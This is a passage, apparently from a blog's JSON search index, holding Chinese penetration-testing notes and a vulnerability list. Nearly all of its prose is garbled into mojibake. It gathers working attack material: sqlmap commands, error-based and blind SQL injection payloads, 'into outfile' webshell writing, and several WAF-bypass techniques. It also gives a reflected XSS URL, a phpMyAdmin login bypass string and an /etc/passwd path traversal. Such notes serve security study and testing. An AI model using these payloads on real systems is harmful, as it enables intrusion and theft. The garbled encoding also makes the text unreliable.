è¿›ä¸€æ­¥æ¢æµ‹ç½‘ç«™çš„ä¿¡æ¯ï¼Œåå°ï¼Œæ•æ„Ÿæ–‡ä»¶ 2ï¼‰æ¼æ´æ‰«æ å¼€å§‹æ£€æµ‹æ¼æ´ï¼Œå¦‚XSS,XSRF,sqlæ³¨å…¥ï¼Œä»£ç æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œï¼Œè¶Šæƒè®¿é—®ï¼Œç›®å½•è¯»å–ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸‹è½½ï¼Œæ–‡ä»¶åŒ…å«ï¼Œ è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¼±å£ä»¤ï¼Œä¸Šä¼ ï¼Œç¼–è¾‘å™¨æ¼æ´ï¼Œæš´åŠ›ç ´è§£ç­‰ 3ï¼‰æ¼æ´åˆ©ç”¨ åˆ©ç”¨ä»¥ä¸Šçš„æ–¹å¼æ‹¿åˆ°webshellï¼Œæˆ–è€…å…¶ä»–æƒé™ 4ï¼‰æƒé™æå‡ ææƒæœåŠ¡å™¨ï¼Œæ¯”å¦‚windowsä¸‹mysqlçš„udfææƒï¼Œserv-uææƒï¼Œwindowsä½ç‰ˆæœ¬çš„æ¼æ´ï¼Œå¦‚iis6,pr,å·´è¥¿çƒ¤è‚‰ï¼Œ linuxè—ç‰›æ¼æ´ï¼Œlinuxå†…æ ¸ç‰ˆæœ¬æ¼æ´ææƒï¼Œlinuxä¸‹çš„mysql systemææƒä»¥åŠoracleä½æƒé™ææƒ æ—¥å¿—æ¸…ç† 6ï¼‰æ€»ç»“æŠ¥å‘ŠåŠä¿®å¤æ–¹æ¡ˆ sqlmapï¼Œæ€ä¹ˆå¯¹ä¸€ä¸ªæ³¨å…¥ç‚¹æ³¨å…¥ï¼Ÿ 1ï¼‰å¦‚æœæ˜¯getå‹å·ï¼Œç›´æ¥ï¼Œsqlmap -u â€œè¯¸å¦‚ç‚¹ç½‘å€â€. å¦‚æœæ˜¯postå‹è¯¸å¦‚ç‚¹ï¼Œå¯ä»¥sqlmap -u â€œæ³¨å…¥ç‚¹ç½‘å€â€ â€“data=â€postçš„å‚æ•°â€ 3ï¼‰å¦‚æœæ˜¯cookieï¼ŒX-Forwarded-Forç­‰ï¼Œå¯ä»¥è®¿é—®çš„æ—¶å€™ï¼Œç”¨burpsuiteæŠ“åŒ…ï¼Œæ³¨å…¥å¤„ç”¨*å·æ›¿æ¢ï¼Œæ”¾åˆ°æ–‡ä»¶é‡Œï¼Œç„¶åsqlmap -r â€œæ–‡ä»¶åœ°å€â€ nmapï¼Œæ‰«æçš„å‡ ç§æ–¹å¼ sqlæ³¨å…¥çš„å‡ ç§ç±»å‹ï¼Ÿ 1ï¼‰æŠ¥é”™æ³¨å…¥ 2ï¼‰boolå‹æ³¨å…¥ 3ï¼‰å»¶æ—¶æ³¨å…¥ 4ï¼‰å®½å­—èŠ‚æ³¨å…¥ æŠ¥é”™æ³¨å…¥çš„å‡½æ•°æœ‰å“ªäº›ï¼Ÿ 1ï¼‰and extractvalue(1, concat(0x7e,(select @@version),0x7e))ã€‘ã€‘ã€‘â€”â€”â€”â€”â€”- 2ï¼‰é€šè¿‡flooræŠ¥é”™ å‘ä¸‹å–æ•´ 3ï¼‰+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) 4ï¼‰.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); 5ï¼‰.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); 6ï¼‰.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); 7ï¼‰.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); 8ï¼‰.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); 9ï¼‰.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); 10ï¼‰.exp()select * from test where id=1 and exp(~(select * from(select user())a)); å»¶æ—¶æ³¨å…¥å¦‚ä½•æ¥åˆ¤æ–­ï¼Ÿ if(ascii(substr(â€œhelloâ€, 1, 1))=104, sleep(5), 1) ç›²æ³¨å’Œå»¶æ—¶æ³¨å…¥çš„å…±åŒç‚¹ï¼Ÿ éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦çš„åˆ¤æ–­ å¦‚ä½•æ‹¿ä¸€ä¸ªç½‘ç«™çš„webshellï¼Ÿ ä¸Šä¼ ï¼Œåå°ç¼–è¾‘æ¨¡æ¿ï¼Œsqlæ³¨å…¥å†™æ–‡ä»¶ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œä»£ç æ‰§è¡Œï¼Œ ä¸€äº›å·²ç»çˆ†å‡ºçš„cmsæ¼æ´ï¼Œæ¯”å¦‚dedecmsåå°å¯ä»¥ç›´æ¥å»ºç«‹è„šæœ¬æ–‡ä»¶ï¼Œwordpressä¸Šä¼ æ’ä»¶åŒ…å«è„šæœ¬æ–‡ä»¶zipå‹ç¼©åŒ…ç­‰ sqlæ³¨å…¥å†™æ–‡ä»¶éƒ½æœ‰å“ªäº›å‡½æ•°ï¼Ÿ select â€˜ä¸€å¥è¯â€™ into outfile â€˜è·¯å¾„â€™ select â€˜ä¸€å¥è¯â€™ into dumpfile â€˜è·¯å¾„â€™ select â€˜â€™ into dumpfile â€˜d:\\wwwroot[http://baidu.com](https://links.jianshu.com/go?to=http%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%3A%2F%2Fbaidu.com)*\\nvhack.php&#39;;* å¦‚ä½•é˜²æ­¢CSRF? 1,éªŒè¯referer 2ï¼ŒéªŒè¯token è¯¦ç»†ï¼šæµ…è°ˆcnodeç¤¾åŒºå¦‚ä½•é˜²æ­¢csrfæ”»å‡» - CNodeæŠ€æœ¯ç¤¾åŒº owasp æ¼æ´éƒ½æœ‰å“ªäº›ï¼Ÿ 1ã€SQLæ³¨å…¥é˜²æŠ¤æ–¹æ³•ï¼š 2ã€å¤±æ•ˆçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç† 3ã€è·¨ç«™è„šæœ¬æ”»å‡»XSS 4ã€ç›´æ¥å¼•ç”¨ä¸å®‰å…¨çš„å¯¹è±¡ 5ã€å®‰å…¨é…ç½®é”™è¯¯ 6ã€æ•æ„Ÿä¿¡æ¯æ³„éœ² 7ã€ç¼ºå°‘åŠŸèƒ½çº§çš„è®¿é—®æ§åˆ¶ 8ã€è·¨ç«™è¯·æ±‚ä¼ªé€ CSRF 9ã€ä½¿ç”¨å«æœ‰å·²çŸ¥æ¼æ´çš„ç»„ä»¶ 10ã€æœªéªŒè¯çš„é‡å®šå‘å’Œè½¬å‘ SQLæ³¨å…¥é˜²æŠ¤æ–¹æ³•ï¼Ÿ 1ã€ä½¿ç”¨å®‰å…¨çš„API 2ã€å¯¹è¾“å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒEscapeè½¬ä¹‰å¤„ç† 3ã€ä½¿ç”¨ç™½åå•æ¥è§„èŒƒåŒ–è¾“å…¥éªŒè¯æ–¹æ³• 4ã€å¯¹å®¢æˆ·ç«¯è¾“å…¥è¿›è¡Œæ§åˆ¶ï¼Œä¸å…è®¸è¾“å…¥SQLæ³¨å…¥ç›¸å…³çš„ç‰¹æ®Šå­—ç¬¦ 5ã€æœåŠ¡å™¨ç«¯åœ¨æäº¤æ•°æ®åº“è¿›è¡ŒSQLæŸ¥è¯¢ä¹‹å‰ï¼Œå¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰ã€æ›¿æ¢ã€åˆ é™¤ã€‚ ä»£ç æ‰§è¡Œï¼Œæ–‡ä»¶è¯»å–ï¼Œå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½æœ‰å“ªäº›ï¼Ÿ 1ï¼Œä»£ç æ‰§è¡Œï¼ševal,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function 2ï¼Œæ–‡ä»¶è¯»å–ï¼šfile_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()ç­‰ 3ï¼Œå‘½ä»¤æ‰§è¡Œï¼šsystem(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() imgæ ‡ç­¾é™¤äº†onerrorå±æ€§å¤–ï¼Œè¿˜æœ‰å…¶ä»–è·å–ç®¡ç†å‘˜è·¯å¾„çš„åŠæ³•å—ï¼Ÿ srcæŒ‡å®šä¸€ä¸ªè¿œç¨‹çš„è„šæœ¬æ–‡ä»¶ï¼Œè·å–referer imgæ ‡ç­¾é™¤äº†onerrorå±æ€§å¤–ï¼Œå¹¶ä¸”srcå±æ€§çš„åç¼€åï¼Œå¿…é¡»ä»¥.jpgç»“å°¾ï¼Œæ€ä¹ˆè·å–ç®¡ç†å‘˜è·¯å¾„ã€‚ 1,è¿œç¨‹æœåŠ¡å™¨ä¿®æ”¹apacheé…ç½®æ–‡ä»¶ï¼Œé…ç½®.jpgæ–‡ä»¶ä»¥phpæ–¹å¼æ¥è§£æ AddType application/x-httpd-php .jpg ä¼šä»¥phpæ–¹å¼æ¥è§£æ ä»£ç å®¡è®¡ eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function æ–‡ä»¶è¯»å–ï¼šfile_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()ç­‰ å‘½ä»¤æ‰§è¡Œï¼šsystem(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() ç»•è¿‡waf 1ã€å…³é”®å­—å¯ä»¥ç”¨%ï¼ˆåªé™IISç³»åˆ—ï¼‰ã€‚æ¯”å¦‚selectï¼Œå¯ä»¥sel%e%ctã€‚åŸç†ï¼šç½‘ç»œå±‚wafå¯¹SEL%E%CTè¿›è¡Œurlè§£ç åå˜æˆSEL%E%CTï¼ŒåŒ¹é…selectå¤±è´¥ï¼Œè€Œè¿›å…¥asp.dllå¯¹SEL%E%CTè¿›è¡Œurlè§£ç å´å˜æˆselectã€‚IISä¸‹çš„asp.dllæ–‡ä»¶åœ¨å¯¹aspæ–‡ä»¶åå‚æ•°ä¸²è¿›è¡Œurlè§£ç æ—¶ï¼Œä¼šç›´æ¥è¿‡æ»¤æ‰09-0dï¼ˆ09æ˜¯tabé”®,0dæ˜¯å›è½¦ï¼‰ã€20ï¼ˆç©ºæ ¼ï¼‰ã€%(åä¸¤ä¸ªå­—ç¬¦æœ‰ä¸€ä¸ªä¸æ˜¯åå…­è¿›åˆ¶)å­—ç¬¦ã€‚xssä¹Ÿæ˜¯åŒç†ã€‚ 2ã€é€šæ€çš„ï¼Œå†…è”æ³¨é‡Šã€‚å®‰å…¨ç‹—ä¸æ‹¦æˆªï¼Œä½†æ˜¯å®‰å…¨å®ã€åŠ é€Ÿä¹ã€Dç›¾ç­‰ï¼Œçœ‹åˆ°/!/å°±Fackäº†ï¼Œæ‰€ä»¥åªé™äºå®‰å…¨ç‹—ã€‚æ¯”å¦‚ï¼š/!select*/ 3ã€ç¼–ç ã€‚è¿™ä¸ªæ–¹æ³•å¯¹wafå¾ˆæœ‰æ•ˆæœï¼Œå› ä¸ºä¸€èˆ¬wafä¼šè§£ç ï¼Œä½†æ˜¯æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œè¿›è¡Œä¸¤æ¬¡ç¼–ç ï¼Œä»–è§£äº†ç¬¬ä¸€æ¬¡ä½†ä¸ä¼šè§£ç¬¬äºŒæ¬¡ï¼Œå°±bypassäº†ã€‚è…¾è®¯wafã€ç™¾åº¦wafç­‰ç­‰éƒ½å¯ä»¥è¿™æ ·bypassçš„ã€‚ 4ï¼Œç»•è¿‡ç­–ç•¥ä¸€ï¼šä¼ªé€ æœç´¢å¼•æ“ æ—©äº›ç‰ˆæœ¬çš„å®‰å…¨ç‹—æ˜¯æœ‰è¿™ä¸ªæ¼æ´çš„ï¼Œå°±æ˜¯æŠŠUser-Agentä¿®æ”¹ä¸ºæœç´¢å¼•æ“ 5ï¼Œ360webscanè„šæœ¬å­˜åœ¨è¿™ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºadmin dede installç­‰ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸åšæ‹¦æˆª \\1. GET /pen/news.php?id=1 union select user,password from mysql.user \\1. GET /pen/news.php/admin?id=1 union select user,password from mysql.user \\1. GET /pen/admin/..\\news.php?id=1 union select user,password from mysql.user 6ï¼Œmultipartè¯·æ±‚ç»•è¿‡ï¼Œåœ¨POSTè¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶ï¼Œç»•è¿‡äº†ç»å¤§å¤šæ•°WAFã€‚ 7ï¼Œå‚æ•°ç»•è¿‡ï¼Œå¤åˆ¶å‚æ•°ï¼Œid=1&amp;id=1 ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦ä»£æ›¿ç©ºæ ¼ï¼Œæ¯”å¦‚åœ¨mysqlä¸­%0aæ˜¯æ¢è¡Œï¼Œå¯ä»¥ä»£æ›¿ç©ºæ ¼ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥éƒ¨åˆ†ç»•è¿‡æœ€æ–°ç‰ˆæœ¬çš„å®‰å…¨ç‹—ï¼Œåœ¨sqlserverä¸­å¯ä»¥ç”¨/**/ä»£æ›¿ç©ºæ ¼ 8,å†…è”æ³¨é‡Šï¼Œ æ–‡ä»¶ä¸Šä¼ ï¼Œå¤åˆ¶æ–‡ä»¶åŒ…ä¸€ä»½å†åŠ ä¸€ä»½ åœ¨ form-data;åé¢å¢åŠ ä¸€å®šçš„å­—ç¬¦ å®½å­—ç¬¦æ³¨å…¥ å®½å­—ç¬¦ï¼šè§£ å†³æ–¹æ³•ï¼šå°±æ˜¯åœ¨åˆå§‹åŒ–è¿æ¥å’Œå­—ç¬¦é›†ä¹‹åï¼Œä½¿ç”¨SET character_set_client=binaryæ¥è®¾å®šå®¢æˆ·ç«¯çš„å­—ç¬¦é›†æ˜¯äºŒè¿›åˆ¶çš„ã€‚ä¿®æ”¹Windowsä¸‹çš„MySQLé…ç½®æ–‡ä»¶ä¸€èˆ¬æ˜¯ my.iniï¼ŒLinuxä¸‹çš„MySQLé…ç½®æ–‡ä»¶ä¸€èˆ¬æ˜¯my.cnfï¼Œæ¯”å¦‚ï¼šmysql_query(â€œSETcharacter_set_client=binaryâ€);ã€‚character_set_clientæŒ‡å®šçš„æ˜¯SQLè¯­å¥çš„ç¼–ç ï¼Œå¦‚æœè®¾ç½®ä¸º binaryï¼ŒMySQLå°±ä»¥äºŒè¿›åˆ¶æ¥æ‰§è¡Œï¼Œè¿™æ ·å®½å­—èŠ‚ç¼–ç é—®é¢˜å°±æ²¡æœ‰ç”¨æ­¦ä¹‹åœ°äº†ã€‚ æ¸—é€æµ‹è¯•æ€è·¯","categories":[],"tags":[],"keywords":[]},{"title":"webå¸¸è§æ¼æ´","slug":"webå¸¸è§æ¼æ´","date":"2019-11-20T14:41:36.000Z","updated":"2020-09-20T09:04:55.636Z","comments":true,"path":"2019/11/20/webå¸¸è§æ¼æ´/","link":"","permalink":"https://zhangyanlady.github.io/2019/11/20/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"1. æš´åŠ›çŒœè§£ç”¨æˆ·ååŠå¯†ç  ç¬¬ä¸€æ­¥è‚¯å®šæ˜¯è¦åšè¿™ä¸ªå·¥ä½œçš„ï¼Œä¸æä¾›æµ‹è¯•è´¦å·ï¼Œå½“ç„¶è¦æš´åŠ›çŒœè§£ä¸€ä¸‹äº†ã€‚å°è¯•ä¸€äº›å¼±å£ä»¤å¦‚admin:admin, test:test, weblogic:weblogic, root:passwdç­‰ç­‰ï¼Œå¦‚ä»¥ä¸‹åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„å£ä»¤test:testã€‚ 2. æ‰«æ•æ„Ÿç›®å½•åŠå¤‡ä»½æ–‡ä»¶ æ‰«ç›®å½•æ˜¯ä¸€é—¨å¾ˆå¤§çš„å­¦é—®ï¼Œæ‰«ç›®å½•æ‰«å¥½äº†ï¼Œå¾ˆå¤šå¤§å‹ç«™ç‚¹å°±å› æ•æ„Ÿç›®å½•ã€å¤‡ä»½æ–‡ä»¶ã€ä¸Šä¼ æ–‡ä»¶åŠç¼–è¾‘å™¨é¡µé¢è€Œæ²¦é™·ã€‚ä¸‹é¢ä¸¾ä¸€ä¸ªæ¸—é€å®ä¾‹ï¼Œä¸‹é¢è¿™ä¸ªç½‘å€ä¸€çœ‹ç»™äººæ— ä»ä¸‹æ‰‹çš„æ„Ÿè§‰ï¼Œäºæ˜¯æ‰«äº†ä¸€ä¸‹å®ƒçš„ç›®å½•ï¼Œæ‰«å‡ºæ¥ä¸€ä¸ªåºŸå¼ƒé¡µé¢ï¼Œè€Œè¿™ä¸ªé¡µé¢æ°å¥½å­˜åœ¨strutsæ¼æ´ã€‚ ä¸€çœ‹æ˜¯æŠ¥é”™çš„ï¼Œå…¶å®ä¸¢åˆ°å·¥å…·é‡Œæµ‹è¯•ä¸€ä¸‹ï¼ŒStruts æ¥ç€æ‰«æå‘ç°ç½‘ç«™æ ¹ç›®è¿˜æœ‰ä¸€ä¸ªWeb.raræ–‡ä»¶ã€‚ å‘ç°é—¨æˆ·ç½‘ç«™å­˜åœ¨æ•æ„Ÿæ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œæµ‹è¯•äººå‘˜é€šè¿‡ä¸‹è½½Web.raræ–‡ä»¶å¯è·å–MSSQLSSAè¿æ¥ç”¨æˆ·åå¯†ç ,é€šè¿‡æµ‹è¯•æ•°æ®åº“å¯è¿œç¨‹è¿æ¥ã€‚ 3. PhpMyadminçš„ä¸‡èƒ½å¯†ç  â€‹ è¿™æ˜¯æŸä¼šè®®å€¼å®ˆæ—¶é‡åˆ°ä¸€ä¸ªphpmyadminçš„ä¸‡èƒ½å¯†ç ï¼Œæå…¶ç½•è§ï¼Œæœ‰ç”Ÿä¹‹å¹´å¤§æ¦‚ä¸ä¼šé‡åˆ°ç¬¬äºŒæ¬¡ï¼Œè¿™é‡Œåªæ˜¯æä¾›ä¸€ä¸ªæ€è·¯ï¼Œè¾“å…¥localhostâ€™@â€˜@â€å³å¯ç»•è¿‡phpmyadminçš„ç™»å½•å…¥å£ã€‚ 4. æŠ¥é”™é¡µé¢çš„å›¾ç‰‡ä¹Ÿæ˜¯å¯ä»¥å­˜åœ¨åå°„å‹XSSçš„ è¿™ä¸ªä¹Ÿæ˜¯ç¢°å·§æ‰¾åˆ°çš„ï¼Œä¹Ÿæ˜¯è¢«é€¼å‡ºæ¥çš„ã€‚è¿™ä¸ªç«™ç‚¹å®åœ¨æ˜¯è¿‡æ»¤å¾—å¤ªä¸¥æ ¼ï¼Œæ— èŠä¸­åœ¨ä¸€ä¸ªå›¾ç‰‡åé¢åŠ äº†ç‚¹ç‰¹æ®Šå­—ç¬¦ï¼Œæ²¡æƒ³åˆ°è¿™äº›å­—ç¬¦è¢«è¿”å›åˆ°é¡µé¢ä¸­å»äº†ã€‚ç„¶ååŠ ä¸Šè·¨ç«™ä»£ç ï¼Œæ²¡æƒ³åˆ°è¿™ä¸ªpngå›¾ç‰‡é¡µé¢æ˜¯å…ˆXSSå¼¹çª—ï¼Œç„¶åWAFå†æç¤ºâ€œä¿¡æ¯æç¤ºï¼šè¯·ä¸è¦æäº¤æ¶æ„å­—ç¬¦â€ï¼Œè¿™ä¸ªçœŸæ˜¯æ— è¯­ã€‚ http://xxxxxx.com/BICP/framework/images/mainSkin/mainFrm/errorIcon.pngâ€&gt;&lt;/textarea&gt;&lt;script&gt;alert(/TOPSEC/)&lt;%2fscript&gt;alert(/TOPSEC/) alert(/TOPSEC/) 5. éšè—åŸŸä¸­å¯èƒ½å­˜ç€æ˜æ–‡å¯†ç  ä¸¾ä¸€ä¸ªæŸçœç§»åŠ¨å†…ç½‘çš„æ¸—é€å®ä¾‹ï¼ˆè¿™ä¸ªç¡®åˆ‡çš„è¯´ï¼Œä¸ç®—æ˜¯éšè—åŸŸï¼Œä½†æ˜¯å’Œéšè—åŸŸç±»ä¼¼ã€‚è¯´ç™½äº†ï¼Œå°±æ˜¯æ˜æ–‡å¯†ç å­˜åœ¨å½“å‰é¡µé¢çš„æºç ä¸­ï¼Œä½†æ˜¯ä½ å…‰çœ‹é¡µé¢æ˜¯çœ‹ä¸åˆ°çš„ã€‚ä½†æ˜¯é‚£ä¸ªå…·ä½“å®ä¾‹æˆ‘æ‰¾ä¸åˆ°äº†ï¼Œé‚£ä¸ªå¯†ç æ˜¯éšè—åœ¨ä¸€ä¸ªâ€œæ‰¾å›å¯†ç å¤„â€çš„é¡µé¢ä¸­ï¼‰ çœ‹åˆ°æ²¡ï¼Œå®ƒçš„å¯†ç ç›´æ¥ä¿å­˜åœ¨æºç ä¸­ï¼Œvalueåé¢çš„abc123å°±æ˜¯å¯†ç äº†ã€‚ 6. é€»è¾‘æ¼æ´â€”â€”ä»»æ„ç”¨æˆ·å¯†ç é‡ç½® å„å¼å„æ ·çš„é€»è¾‘æ¼æ´å¹¿æ³›å­˜åœ¨ï¼Œè€Œä¸”å¾ˆéš¾æœç»ï¼Œæ‰«æå™¨å¾ˆéš¾æ‰«æåˆ°ï¼Œè€Œä¸”æ¯ä¸ªäººæ‰¾é€»è¾‘æ¼æ´çš„æ€è·¯åˆä¸ä¸€æ ·ã€‚ å¯†ç æ‰¾å›å¤„ï¼Œä»…ä»…é€šè¿‡æ‰‹æœºéªŒè¯ç æ ¡éªŒï¼Œè€Œä¸”éªŒè¯ç ä»…ä»…ä¸º4ä½æ•°å­—ï¼Œæœ‰æ•ˆæœŸä¸º15åˆ†é’Ÿã€‚åœ¨15åˆ†é’Ÿå†…ï¼Œå®Œå…¨å¯ä»¥éå†0000ç½®9999æ‰€æœ‰çš„éªŒè¯ç ç»„åˆï¼Œæ‰€ä»¥æ­¤æ¼æ´å¯ä»¥é‡ç½®åŒ…æ‹¬ç®¡ç†å‘˜åœ¨å†…çš„ä»»æ„ç”¨æˆ·çš„å¯†ç ã€‚ 7. çŸ­ä¿¡ç‚¸å¼¹ â€œçŸ­ä¿¡ç‚¸å¼¹â€å¹¿æ³›å­˜åœ¨ï¼Œè¿™ä¸ªå°±ä¸ç”¨è¯¦ç»†è¯´äº†ï¼Œæœ‰å‘çŸ­ä¿¡çš„åœ°æ–¹ï¼Œå°±è¯•è¯•â€œçŸ­ä¿¡ç‚¸å¼¹â€æ¼æ´å§ã€‚ 8. SVNæºç æ³„éœ² è¿™ä¸ªå®ä¾‹ä¹Ÿæ˜¯æŸçœç§»åŠ¨çš„ï¼Œå¯¹äºå¤§æ•°é‡çš„IPæ®µæ¥è¯´ï¼ŒSVNæºç æ³„éœ²é—®é¢˜é˜²èŒƒå­˜åœ¨ã€‚ https://www.xxx.com/.svn/entries åœ¨ç½‘å€åé¢åŠ /.svn/entriesï¼Œæºç æ³„éœ²äº† 9. æ‰«æä¸€ä¸‹å±€åŸŸç½‘å…±äº« å¦‚æœä½ å¤„åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸å¦¨æ‰«ä¸€æ‰«å±€åŸŸç½‘çš„å…±äº«æ–‡ä»¶å§ã€‚æˆ‘åœ¨æ²³å—å°±é‡åˆ°ä¸€æ¬¡ï¼Œç½‘ç«™çš„é…ç½®æ–‡ä»¶ç›´æ¥è¢«å…±äº«åœ¨å±€åŸŸç½‘ä¸­äº†ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è¿™ä¸ªç®¡ç†å‘˜ä¸ºå•¥è¦æŠŠtomcatç›®å½•å¼€ä¸ªå±€åŸŸç½‘å…±äº«ã€‚ çœ‹çœ‹ä¸‹é¢è¿™å¼ å›¾ï¼Œä¸€ä¸ªç«™å°±è¿™æ ·è¢«æ²¦é™·äº†ï¼Œè¿™ä¸ªç«™ä¹Ÿæ˜¯æ²¡æœ‰æµ‹è¯•è´¦å·ï¼Œä½†æ˜¯çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶åï¼Œä¹Ÿä¸éœ€è¦æµ‹è¯•è´¦å·äº†ã€‚ 10. å…³æ³¨ä¸€äº›éä¸»æµçš„æ¼æ´ï¼Œå¦‚HTTPå“åº”æ‹†åˆ†æ¼æ´ ä»¥å‰åœ¨OWASPä¹¦ä¸­çœ‹åˆ°è¿‡è¿™ä¸€æ¼æ´ï¼Œè¿™å›é‡ä¸Šäº†ã€‚å½“ç„¶ä¸‹è¾¹çš„è¿™ä¸ªæ¼æ´åˆ©ç”¨èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒå›°éš¾çš„ï¼Œå› ä¸ºSETCOOKIEçš„-åŠç©ºæ ¼éƒ½è¢«è¿‡æ»¤æ‰äº†ã€‚ 11. æ‰«ä¸€ä¸‹ç«¯å£ ä¸‹é¢è¿™ä¸ªé¡µé¢ï¼Œä½ çœ‹ç€æ˜¯ä¸æ˜¯è§‰å¾—æ²¡æœ‰ä»€ä¹ˆå¸Œæœ›ï¼Œä¸æƒ³å†æä¸‹å»äº†å‘¢ã€‚ ä½†æ˜¯nmapæ‰«ç«¯å£ï¼Œå¼€æ”¾ç€9091ã€21ç«¯å£ï¼Œæµè§ˆå™¨æ‰“å¼€å‘ç°9091æ˜¯å¦ä¸€ä¸ªWEBåº”ç”¨ï¼Œ http://www.xxx.com:80/ http://www.xxx.com:9091/ https://www.xxx.com/ æœ‰å¯èƒ½å¯¹åº”ç€ä¸åŒçš„WEBåº”ç”¨ï¼Œæ¸—é€æµ‹è¯•åˆå¯ä»¥ç»§ç»­äº†ï¼ˆåŸæ¥çš„æ¸—é€æµ‹è¯•æŠ¥å‘Šæ²¡æ‰¾åˆ°ï¼Œæ²¡åŠæ³•å‘å›¾ 12. å‘æ˜éšè—çš„é“¾æ¥åœ°å€ ä¸Šé¢è¿™ä¸ªé¡µé¢ï¼Œæ²¡æœ‰æµ‹è¯•è´¦å·åŠç”¨æˆ·åï¼Œçœ‹ç€æœ‰ç‚¹æ™•æ™•çš„ï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•ä¸‹æ‰‹ï¼Œä½†æ˜¯å¾ˆå¿«æ³¨æ„åˆ°å·¦ä¸‹è§’çš„ä¸¤ä¸ªé“¾æ¥åœ°å€ï¼Œäºæ˜¯æ‰‹å·¥æµ‹è¯•ä¸€ä¸‹ã€‚ å·¦è¾¹çš„é‚£ä¸ªå¸®åŠ©æ–‡æ¡£æ²¡æœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯å³è¾¹çš„â€œç›¸å…³è½¯ä»¶â€çš„é“¾æ¥ï¼Œå­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ treasuryauth/authAction.do?method=download&amp;fileName=../../../../../../etc/passwd 13. å‘æ˜ä¸€äº›è¶Šæƒçš„æµ‹è¯•é¡µé¢ 14. IISçŸ­æ–‡ä»¶åæ³„éœ²æ¼æ´ å±å®³ï¼šMicrosoft IISåœ¨å®ç°ä¸Šå­˜åœ¨æ–‡ä»¶æšä¸¾æ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æšä¸¾ç½‘ç»œæœåŠ¡å™¨æ ¹ç›®å½•ä¸­çš„æ–‡ä»¶ã€‚å±å®³ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨â€œ~â€å­—ç¬¦çŒœè§£æˆ–éå†æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶åï¼Œæˆ–å¯¹IISæœåŠ¡å™¨ä¸­çš„.Net Frameworkè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ éªŒè¯æ–¹æ³•è¯´æ˜ï¼šåœ¨å‘½ä»¤è¡Œæ¨¡å¼è¿è¡ŒIIS-shortnameå·¥å…·ï¼Œæ‰§è¡Œjava scanner 2 20 http://www.xxx.comå›è½¦æ‰§è¡Œï¼Œçœ‹æ˜¯å¦èƒ½éå†æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶åã€‚ 15. jQueryå­˜åœ¨XSSæ¼æ´ å±å®³ï¼šjQueryæ˜¯ä¸€ä¸ª JavaScript åº“ã€‚ç‰ˆæœ¬ä½äº1.7çš„jQueryè¿‡æ»¤ç”¨æˆ·è¾“å…¥æ•°æ®æ‰€ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼å­˜åœ¨ç¼ºé™·ï¼Œå¯èƒ½å¯¼è‡´LOCATION.HASHè·¨ç«™æ¼æ´ éªŒè¯æ–¹æ³•è¯´æ˜ï¼šç›´æ¥åœ¨ç«ç‹æµè§ˆå™¨æ‰“å¼€JQueryæ¼æ´åœ°å€ï¼ŒæŸ¥çœ‹æºä»£ç é‡Œé¢çš„JQueryç‰ˆæœ¬æ˜¯å¦å­˜åœ¨ä½äº1.7ï¼Œå¦‚æœä½äº1.7é‚£ä¹ˆå°±å­˜åœ¨æ¼æ´ã€‚ 16. ç›®å½•æµè§ˆæ¼æ´ å±å®³ï¼šç”±äºWebæœåŠ¡å™¨æƒé™é…ç½®ä¸å½“ï¼Œé€ 